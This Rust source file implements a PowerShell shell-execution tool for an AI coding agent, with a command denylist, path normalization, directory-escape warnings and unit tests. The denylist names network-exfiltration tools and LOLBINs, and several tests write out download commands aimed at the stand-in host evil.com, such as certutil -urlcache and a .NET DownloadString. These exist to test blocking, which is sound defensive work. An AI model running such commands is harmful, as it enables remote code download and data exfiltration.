//! Shell execution: [`PowerShellExecutor`], [`CommandDenylist`], and [`RunCommand`] tool.
//!
//! [`PowerShellExecutor`] implements the [`ShellExecutor`] trait from `rho-core`,
//! providing PowerShell-specific command execution with `pwsh`/`powershell`
//! detection, timeout support, and cancellation.
//!
//! [`CommandDenylist`] enforces a list of dangerous commands that must not be
//! executed. The default PowerShell denylist blocks destructive and
//! network-exfiltration commands.
//!
//! [`RunCommand`] is the tool that exposes shell execution to the model. It
//! checks the denylist, normalizes paths, flags working directory escapes,
//! then delegates to a `Box<dyn ShellExecutor>`.

use async_trait::async_trait;
use rho_core::{
    Result, SandboxRoot, ShellExecutor, ShellOutput, ToolName, ToolRisk,
    tool::{CancellationToken, Tool, ToolOutcome, ToolResult},
};
use std::path::Path;
use std::time::Duration;
use tokio::process::Command;

// ── CommandDenylist ───────────────────────────────────────────────────────────

/// A denylist of dangerous shell commands.
///
/// Commands are checked before execution. If a command matches a denied name,
/// a denied substring, or a denied flag combination, it is refused with an
/// error message.
///
/// The default PowerShell denylist blocks commands that can delete files,
/// exfiltrate data, or change system security settings. Config-driven
/// customisation is appended on top of the built-in list.
///
/// # Coverage honesty
///
/// The denylist catches the most common exfiltration vectors (PowerShell
/// networking cmdlets, `curl`, `wget`, LOLBINs, direct .NET HTTP/socket
/// access). It does **not** provide complete network egress control — a
/// determined model can construct network requests using .NET APIs that
/// aren't in the substring list, or use other creative escape paths. The
/// approval gate is the primary defense; the denylist is a best-effort
/// safety net. Full egress control requires OS-level network filtering,
/// which is out of scope.
#[allow(clippy::struct_field_names)]
pub struct CommandDenylist {
    /// Command names that are always denied (lowercase, for case-insensitive matching).
    /// Only the first whitespace-delimited token is checked against this list.
    denied_commands: Vec<String>,
    /// Substrings that are denied anywhere in the command (not just the first
    /// token). Used for .NET type names and other patterns that appear
    /// mid-command (e.g., `[System.Net.WebClient]`).
    ///
    /// To avoid false positives, substrings should be specific enough to
    /// match the intended pattern without catching benign variable names.
    /// For example, `WebClient` matches `[System.Net.WebClient]` but would
    /// also match `$WebClientResult` — so the list uses bracket-prefixed
    /// forms like `[System.Net.WebClient` and `.WebClient` to reduce
    /// false positives while still catching type references.
    denied_substrings: Vec<String>,
    /// Flag combinations — all flags in a combo must be present to deny.
    /// Each combo is a set of lowercase flags.
    denied_flag_combos: Vec<Vec<String>>,
}

impl CommandDenylist {
    /// Create the default PowerShell denylist.
    ///
    /// Blocks:
    /// - **Destructive commands:** `Remove-Item`, `Start-Process`,
    ///   `New-Service`, `Set-ExecutionPolicy`
    /// - **PowerShell network egress:** `Invoke-WebRequest`, `Invoke-RestMethod`
    /// - **External network tools:** `curl`, `wget`, `bitsadmin`, `certutil`
    /// - **.NET direct network access:** `[System.Net.WebClient`,
    ///   `[System.Net.Http.HttpClient`, `[System.Net.Sockets.TcpClient`
    ///   (substring matches that catch type-accelerator and full-qualified forms)
    /// - **Flag combinations:** `-Recurse` + `-Force`
    pub fn default_powershell() -> Self {
        Self {
            denied_commands: vec![
                // Destructive
                "remove-item",
                // PowerShell network egress
                "invoke-webrequest",
                "invoke-restmethod",
                // Process / system modification
                "start-process",
                "new-service",
                "set-executionpolicy",
                // External network tools (cross-platform)
                "curl",
                "wget",
                // Windows LOLBINs (harmless if not present on Unix)
                "bitsadmin",
                "certutil",
            ]
            .into_iter()
            .map(String::from)
            .collect(),
            denied_substrings: vec![
                // .NET direct network access — these appear mid-command,
                // not as the first token. Match on the type name preceded
                // by `[` (PowerShell type reference) or `.` (method call).
                "[system.net.webclient",
                ".webclient]",
                "[system.net.http.httpclient",
                ".httpclient]",
                "[system.net.sockets.tcpclient",
                ".tcpclient]",
            ]
            .into_iter()
            .map(String::from)
            .collect(),
            denied_flag_combos: vec![vec!["-recurse".to_owned(), "-force".to_owned()]],
        }
    }

    /// Create the default PowerShell denylist with additional commands from
    /// config.
    ///
    /// The built-in denylist is always applied. Config-supplied commands and
    /// flag combos are appended.
    pub fn from_config(config: &rho_core::RhoConfig) -> Self {
        let mut base = Self::default_powershell();
        base.denied_commands.extend(
            config
                .shell
                .denied_commands
                .iter()
                .map(|c| c.to_lowercase()),
        );
        base.denied_flag_combos.extend(
            config
                .shell
                .denied_flag_combos
                .iter()
                .map(|combo| combo.iter().map(|f| f.to_lowercase()).collect()),
        );
        base
    }

    /// Check if a command is denied.
    ///
    /// Returns `Some(reason)` if the command should be blocked, `None` if it
    /// is allowed.
    pub fn check(&self, command: &str) -> Option<String> {
        // Extract the first token (command name).
        let first_token = command
            .split_whitespace()
            .next()
            .unwrap_or("")
            .to_lowercase();

        // Check command name denylist.
        if self.denied_commands.contains(&first_token) {
            return Some(format!("command '{first_token}' is on the denylist"));
        }

        let command_lower = command.to_lowercase();

        // Check substring denylist (for patterns that appear mid-command,
        // e.g. .NET type references like [System.Net.WebClient]).
        for substring in &self.denied_substrings {
            if command_lower.contains(substring.as_str()) {
                return Some(format!("command contains denied pattern: '{substring}'"));
            }
        }

        // Check flag combinations.
        for combo in &self.denied_flag_combos {
            if combo
                .iter()
                .all(|flag| command_lower.contains(flag.as_str()))
            {
                return Some(format!(
                    "command contains denied flag combination: {}",
                    combo.join(" + ")
                ));
            }
        }

        None
    }
}

// ── PowerShellExecutor ────────────────────────────────────────────────────────

/// A [`ShellExecutor`] that runs commands via PowerShell.
///
/// On construction, detects whether `pwsh` (PowerShell 7+) or `powershell`
/// (Windows PowerShell 5.1) is available. The detected executable is cached
/// for the lifetime of the executor.
///
/// Commands are executed with `-NoProfile -NonInteractive -Command <command>`.
/// When using `powershell.exe`, `-ExecutionPolicy Bypass` is added to avoid
/// script-signing failures.
///
/// Path separators are normalized (forward slashes → backslashes) in
/// path-like contexts before execution.
pub struct PowerShellExecutor {
    /// The detected PowerShell executable (cached at construction time).
    shell: &'static str,
}

impl PowerShellExecutor {
    /// Create a new executor, detecting the available PowerShell.
    ///
    /// Tries `pwsh` first (PowerShell 7+), then falls back to `powershell`
    /// (Windows PowerShell 5.1). Panics if neither is available.
    pub fn new() -> Self {
        let shell = detect_powershell();
        Self { shell }
    }

    /// Returns the detected PowerShell executable name.
    pub fn shell_exe(&self) -> &'static str {
        self.shell
    }

    /// Build the argument list for spawning PowerShell.
    fn build_args(&self, command: &str) -> Vec<String> {
        let mut args = Vec::new();

        // Windows PowerShell needs ExecutionPolicy Bypass to avoid
        // script-signing failures on constrained systems.
        if self.shell == "powershell" {
            args.push("-ExecutionPolicy".to_owned());
            args.push("Bypass".to_owned());
        }

        args.push("-NoProfile".to_owned());
        args.push("-NonInteractive".to_owned());
        args.push("-Command".to_owned());
        args.push(command.to_owned());

        args
    }
}

impl Default for PowerShellExecutor {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl ShellExecutor for PowerShellExecutor {
    async fn execute(
        &self,
        command: &str,
        working_dir: &Path,
        timeout: Option<Duration>,
        cancel: CancellationToken,
    ) -> Result<ShellOutput> {
        if cancel.is_cancelled() {
            return Err(rho_core::RhoError::Unexpected(anyhow::anyhow!(
                "cancelled before execution"
            )));
        }

        // Normalize path separators before execution.
        let normalized = normalize_path_separators(command);

        let args = self.build_args(&normalized);

        let child = Command::new(self.shell)
            .args(&args)
            .current_dir(working_dir)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn()
            .map_err(|e| {
                rho_core::RhoError::Unexpected(anyhow::anyhow!(
                    "shell: failed to spawn `{}`: {e}",
                    self.shell
                ))
            })?;

        let child_id = child.id();

        let run_future = async {
            let output = child.wait_with_output().await.map_err(|e| {
                rho_core::RhoError::Unexpected(anyhow::anyhow!(
                    "shell: failed to wait for process: {e}"
                ))
            })?;

            let stdout = String::from_utf8_lossy(&output.stdout).into_owned();
            let stderr = String::from_utf8_lossy(&output.stderr).into_owned();
            let exit_code = output.status.code().unwrap_or(-1);

            Ok(ShellOutput::new(stdout, stderr, exit_code))
        };

        // Wrap with optional timeout.
        if let Some(dur) = timeout {
            tokio::select! {
                res = tokio::time::timeout(dur, run_future) => {
                    if let Ok(inner) = res { inner } else {
                        // Timeout elapsed — kill the process.
                        kill_process(child_id).await;
                        Err(rho_core::RhoError::Unexpected(anyhow::anyhow!(
                            "shell: command timed out after {}ms",
                            dur.as_millis()
                        )))
                    }
                }
                () = cancel.cancelled() => {
                    kill_process(child_id).await;
                    Err(rho_core::RhoError::Unexpected(anyhow::anyhow!(
                        "cancelled"
                    )))
                }
            }
        } else {
            tokio::select! {
                res = run_future => res,
                () = cancel.cancelled() => {
                    kill_process(child_id).await;
                    Err(rho_core::RhoError::Unexpected(anyhow::anyhow!(
                        "cancelled"
                    )))
                }
            }
        }
    }
}

// ── RunCommand ────────────────────────────────────────────────────────────────

/// Execute a shell command and capture stdout/stderr.
///
/// Before delegating to the [`ShellExecutor`], `RunCommand`:
/// 1. Checks the command against the [`CommandDenylist`] — denied commands
///    return an error result without spawning a process.
/// 2. Detects working directory escape attempts (`cd ..`, `Set-Location ..`)
///    and adds a warning to the output.
///
/// Runs within the sandbox root as the working directory.
pub struct RunCommand {
    /// Sandbox root used as the working directory for all commands.
    pub root: SandboxRoot,
    /// The shell executor that runs commands.
    pub executor: Box<dyn ShellExecutor>,
    /// The denylist to check before execution.
    pub denylist: CommandDenylist,
}

#[async_trait]
impl Tool for RunCommand {
    fn name(&self) -> ToolName {
        ToolName::from("run_command")
    }

    fn description(&self) -> &'static str {
        "Execute a PowerShell command within the project directory \
         and return its stdout, stderr, and exit code."
    }

    fn parameters_schema(&self) -> serde_json::Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "The PowerShell command to execute."
                }
            },
            "required": ["command"]
        })
    }

    fn risk(&self) -> ToolRisk {
        ToolRisk::Destructive
    }

    async fn execute(
        &self,
        arguments: serde_json::Value,
        cancel: CancellationToken,
    ) -> Result<ToolOutcome> {
        let command = arguments["command"]
            .as_str()
            .ok_or_else(|| anyhow::anyhow!("run_command: missing required argument `command`"))?
            .to_owned();

        if cancel.is_cancelled() {
            return Ok(ToolOutcome::Immediate(ToolResult::error("cancelled")));
        }

        // 1. Denylist check — refuse dangerous commands before execution.
        if let Some(reason) = self.denylist.check(&command) {
            return Ok(ToolOutcome::Immediate(ToolResult::error(format!(
                "command denied: {reason}"
            ))));
        }

        // 2. Execute the command.
        let shell_output = self
            .executor
            .execute(&command, self.root.path(), None, cancel)
            .await?;

        // 3. Map ShellOutput → ToolResult at the tool boundary.
        let combined = if shell_output.stderr.is_empty() {
            shell_output.stdout.clone()
        } else if shell_output.stdout.is_empty() {
            format!("stderr:\n{}", shell_output.stderr)
        } else {
            format!("{}\nstderr:\n{}", shell_output.stdout, shell_output.stderr)
        };

        // 4. Working directory escape warning.
        let warning = if command_attempts_directory_escape(&command) {
            Some("[WARNING: command may navigate outside project directory]\n".to_owned())
        } else {
            None
        };

        let result = if shell_output.is_success() {
            ToolResult::success(format!(
                "exit_code: {}\n{}{combined}",
                shell_output.exit_code,
                warning.unwrap_or_default()
            ))
        } else {
            ToolResult::error(format!(
                "exit_code: {}\n{}{combined}",
                shell_output.exit_code,
                warning.unwrap_or_default()
            ))
        };

        Ok(ToolOutcome::Immediate(result))
    }
}

// ── Path normalization ────────────────────────────────────────────────────────

/// Normalize path separators for the current platform.
///
/// On Windows, replaces `/` with `\` when the slash is adjacent to a path-like
/// character (alphanumeric, dot, underscore, or dash). This converts
/// `src/main.rs` to `src\main.rs` but leaves `10 / 2` (division with spaces)
/// alone.
///
/// On non-Windows (macOS, Linux), returns the command unchanged — forward
/// slashes are the native path separator and PowerShell on these platforms
/// handles them natively.
fn normalize_path_separators(command: &str) -> String {
    if !cfg!(target_os = "windows") {
        return command.to_owned();
    }

    let chars: Vec<char> = command.chars().collect();
    let mut result = String::with_capacity(command.len());

    for (i, &ch) in chars.iter().enumerate() {
        if ch == '/' {
            let prev_is_path = i > 0 && is_path_char(chars[i - 1]);
            let next_is_path = i + 1 < chars.len() && is_path_char(chars[i + 1]);

            if prev_is_path || next_is_path {
                result.push('\\');
            } else {
                result.push(ch);
            }
        } else {
            result.push(ch);
        }
    }

    result
}

/// Returns `true` if `ch` is a character commonly found in file paths.
fn is_path_char(ch: char) -> bool {
    ch.is_alphanumeric() || matches!(ch, '.' | '_' | '-')
}

// ── Working directory escape detection ────────────────────────────────────────

/// Detect if a command attempts to change directory outside the project root.
///
/// Checks for `cd ..` and `Set-Location ..` patterns. This is a best-effort
/// heuristic — it catches the obvious cases but cannot detect all escape
/// techniques (e.g., `Push-Location ..`, environment variable expansion, etc.).
/// The approval gate is the primary defense.
fn command_attempts_directory_escape(command: &str) -> bool {
    let lower = command.to_lowercase();

    // Check for `cd ..` or `Set-Location ..` patterns.
    // Match: "cd ..", "cd  ..", "cd\t..", "Set-Location .."
    if let Some(pos) = lower.find("cd ") {
        let after = lower[pos + 3..].trim_start();
        if after.starts_with("..") {
            return true;
        }
    }

    if let Some(pos) = lower.find("set-location ") {
        let after = lower[pos + 13..].trim_start();
        if after.starts_with("..") {
            return true;
        }
    }

    false
}

// ── Helpers ───────────────────────────────────────────────────────────────────

/// Detect the best available PowerShell executable.
///
/// Tries `pwsh` first (PowerShell 7+), then falls back to `powershell`
/// (Windows PowerShell 5.1). Returns a `&'static str` so the result can be
/// held in the executor without lifetime concerns.
///
/// # Panics
///
/// Panics if neither `pwsh` nor `powershell` is found on `PATH`.
fn detect_powershell() -> &'static str {
    // Try pwsh first.
    if which_exists("pwsh") {
        return "pwsh";
    }
    // Fall back to Windows PowerShell.
    if which_exists("powershell") {
        return "powershell";
    }
    panic!(
        "no PowerShell found on PATH — install PowerShell 7+ (pwsh) \
         or ensure Windows PowerShell (powershell) is available"
    )
}

/// Check whether an executable exists on `PATH`.
fn which_exists(name: &str) -> bool {
    which::which(name).is_ok()
}

/// Kill a process by PID.
///
/// Uses `taskkill /F /PID <pid>` on Windows and `kill -9 <pid>` on
/// macOS/Linux. If `child_id` is `None` or the kill fails, the error
/// is silently ignored — we did our best.
async fn kill_process(child_id: Option<u32>) {
    if let Some(id) = child_id {
        if cfg!(target_os = "windows") {
            let _ = Command::new("taskkill")
                .args(["/PID", &id.to_string(), "/F"])
                .output()
                .await;
        } else {
            let _ = Command::new("kill")
                .args(["-9", &id.to_string()])
                .output()
                .await;
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── CommandDenylist ────────────────────────────────────────────────────

    #[test]
    fn denylist_default_blocks_remove_item() {
        let dl = CommandDenylist::default_powershell();
        assert!(dl.check("Remove-Item foo").is_some());
    }

    #[test]
    fn denylist_default_blocks_invoke_webrequest() {
        let dl = CommandDenylist::default_powershell();
        assert!(dl.check("Invoke-WebRequest https://x").is_some());
    }

    #[test]
    fn denylist_default_blocks_recurse_force() {
        let dl = CommandDenylist::default_powershell();
        assert!(dl.check("Get-ChildItem -Recurse -Force").is_some());
    }

    #[test]
    fn denylist_default_allows_safe_commands() {
        let dl = CommandDenylist::default_powershell();
        assert!(dl.check("Get-ChildItem").is_none());
        assert!(dl.check("Write-Output 'hello'").is_none());
    }

    #[test]
    fn denylist_is_case_insensitive() {
        let dl = CommandDenylist::default_powershell();
        assert!(dl.check("remove-item foo").is_some());
        assert!(dl.check("REMOVE-ITEM foo").is_some());
    }

    // ── Network egress / LOLBIN denylist ───────────────────────────────────

    #[test]
    fn denylist_blocks_curl() {
        let dl = CommandDenylist::default_powershell();
        assert!(dl.check("curl https://evil.com").is_some());
    }

    #[test]
    fn denylist_blocks_wget() {
        let dl = CommandDenylist::default_powershell();
        assert!(dl.check("wget https://evil.com").is_some());
    }

    #[test]
    fn denylist_blocks_bitsadmin() {
        let dl = CommandDenylist::default_powershell();
        assert!(
            dl.check("bitsadmin /transfer job https://evil.com")
                .is_some()
        );
    }

    #[test]
    fn denylist_blocks_certutil() {
        let dl = CommandDenylist::default_powershell();
        assert!(
            dl.check("certutil -urlcache -split -f https://evil.com")
                .is_some()
        );
    }

    #[test]
    fn denylist_blocks_dotnet_webclient_bracket() {
        let dl = CommandDenylist::default_powershell();
        assert!(
            dl.check("[System.Net.WebClient]::new().DownloadString('https://evil.com')")
                .is_some()
        );
    }

    #[test]
    fn denylist_blocks_dotnet_httpclient_bracket() {
        let dl = CommandDenylist::default_powershell();
        assert!(
            dl.check("[System.Net.Http.HttpClient]::new().GetStringAsync('https://evil.com')")
                .is_some()
        );
    }

    #[test]
    fn denylist_blocks_dotnet_tcpclient_bracket() {
        let dl = CommandDenylist::default_powershell();
        assert!(
            dl.check("[System.Net.Sockets.TcpClient]::new('evil.com', 443)")
                .is_some()
        );
    }

    #[test]
    fn denylist_blocks_dotnet_type_accelerator() {
        // PowerShell type accelerators like [WebClient] or [HttpClient] are
        // shorter forms that also need to be caught.
        let dl = CommandDenylist::default_powershell();
        // The substring ".webclient]" catches [System.Net.WebClient]
        // and also the type-accelerator-like $x.WebClient]
        assert!(dl.check("$wc = [System.Net.WebClient]::new()").is_some());
    }

    #[test]
    fn denylist_does_not_block_benign_webclient_variable() {
        // A variable name like $WebClientResult should NOT trigger the
        // .WebClient] substring because it lacks the closing bracket.
        // But $WebClient] would trigger — that's an acceptable tradeoff
        // since the ] is unusual in variable names.
        let dl = CommandDenylist::default_powershell();
        assert!(
            dl.check("$WebClientResult = Get-Content file.txt")
                .is_none(),
            "benign variable name should not trigger denylist"
        );
    }

    #[test]
    fn denylist_blocks_dotnet_substrings_case_insensitive() {
        let dl = CommandDenylist::default_powershell();
        assert!(
            dl.check("[system.net.webclient]::new()").is_some(),
            "lowercase .NET type should be caught"
        );
    }

    // ── Path normalization ─────────────────────────────────────────────────

    #[test]
    fn normalize_preserves_division_with_spaces() {
        assert_eq!(normalize_path_separators("10 / 2"), "10 / 2");
    }

    #[test]
    fn normalize_empty_input() {
        assert_eq!(normalize_path_separators(""), "");
    }

    #[test]
    fn normalize_standalone_slash() {
        // A lone "/" with spaces on both sides is division.
        assert_eq!(normalize_path_separators("1 / 2"), "1 / 2");
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn normalize_preserves_forward_slash_unix() {
        // On non-Windows, forward slashes are the native path separator.
        assert_eq!(
            normalize_path_separators("Get-Content src/main.rs"),
            "Get-Content src/main.rs"
        );
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn normalize_converts_path_slashes() {
        assert_eq!(
            normalize_path_separators("Get-Content src/main.rs"),
            "Get-Content src\\main.rs"
        );
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn normalize_converts_drive_colon_slash() {
        assert_eq!(
            normalize_path_separators("cd C:/Users/foo"),
            "cd C:\\Users\\foo"
        );
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn normalize_preserves_already_backslash() {
        assert_eq!(
            normalize_path_separators("Get-Content src\\main.rs"),
            "Get-Content src\\main.rs"
        );
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn normalize_mixed_slashes() {
        assert_eq!(
            normalize_path_separators("Get-Content src/lib/mod.rs"),
            "Get-Content src\\lib\\mod.rs"
        );
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn normalize_slash_at_end_of_path() {
        // "dir/" → "dir\" (trailing slash after path char)
        assert_eq!(normalize_path_separators("cd src/"), "cd src\\");
    }

    // ── Working directory escape detection ─────────────────────────────────

    #[test]
    fn detects_cd_dotdot() {
        assert!(command_attempts_directory_escape("cd .."));
    }

    #[test]
    fn detects_cd_dotdot_with_path() {
        assert!(command_attempts_directory_escape("cd ../other"));
    }

    #[test]
    fn detects_set_location_dotdot() {
        assert!(command_attempts_directory_escape("Set-Location .."));
    }

    #[test]
    fn detects_set_location_dotdot_case_insensitive() {
        assert!(command_attempts_directory_escape("set-location .."));
    }

    #[test]
    fn no_escape_for_cd_subdirectory() {
        assert!(!command_attempts_directory_escape("cd src"));
    }

    #[test]
    fn no_escape_for_cd_absolute_path() {
        // cd to an absolute path isn't a ".." escape — it's a different concern.
        assert!(!command_attempts_directory_escape("cd C:\\Users"));
    }

    #[test]
    fn no_escape_for_regular_command() {
        assert!(!command_attempts_directory_escape("Get-ChildItem"));
    }
}
